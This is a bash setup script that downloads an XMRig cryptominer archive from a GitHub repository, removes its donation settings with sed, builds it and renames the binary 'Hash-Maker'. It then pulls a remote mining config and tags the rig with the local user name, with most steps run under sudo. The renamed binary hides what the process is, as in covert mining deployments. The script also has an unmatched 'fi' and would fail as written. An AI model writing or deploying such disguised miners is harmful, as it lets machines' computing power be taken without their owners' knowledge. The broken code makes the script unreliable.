#!/bin/bash

export TZ=America/Sao_Paulo
export LOCAL=$(cat $(find /home -name home.file))
data=$(date +"%d-%m-%Y_%H:%M:%S")
cd $LOCAL
if [ ! -e "CORE/build/Hash-Maker" ]; then

   if [ -e "CORE" ]; then
      sudo rm -rf CORE
   fi

   sudo ./install.sh
   
   wget -N https://github.com/robotpack/base/raw/master/CORE.zip
   unzip CORE.zip
   rm -rf CORE.zip
   cd CORE
   
   sed -i 's/kDefaultDonateLevel =.*/kDefaultDonateLevel = 0;/' src/donate.h
   sed -i 's/kMinimumDonateLevel =.*/kMinimumDonateLevel = 0;/' src/donate.h

   sed -i 's/"url":.*/"url": null,/' src/config.json
   sed -i 's/"donate-level":.*/"donate-level": 0,/' src/config.json
   sed -i 's/"donate-over-proxy":.*/"donate-over-proxy": 0,/' src/config.json

   sed -i 's/"url":.*/"url": null,/' src/core/config/Config_default.h
   sed -i 's/"donate-level":.*/"donate-level": 0,/' src/core/config/Config_default.h
   sed -i 's/"donate-over-proxy":.*/"donate-over-proxy": 0,/' src/core/config/Config_default.h

   sed -i 's/kDonateHost =.*/kDonateHost = "example.com";/' src/net/strategies/DonateStrategy.cpp
   sed -i 's/kDonateHostTls =.*/kDonateHostTls = "example.com";/' src/net/strategies/DonateStrategy.cpp   
   
   mkdir build
   cd build
   cmake ..
   make
   mv xmrig Hash-Maker
   wget -N https://raw.githubusercontent.com/robotpack/scripts/master/config.json
else
   cd CORE/build
   sudo wget -N https://raw.githubusercontent.com/robotpack/scripts/master/config.json
   fi
fi
user=${LOCAL/'/home/'}
sudo sed -i 's/"rig-id":.*/"rig-id": "'$user'",/' config.json

echo 'make.sh ok!'

#sudo nice -n -20 ./Hash-Maker
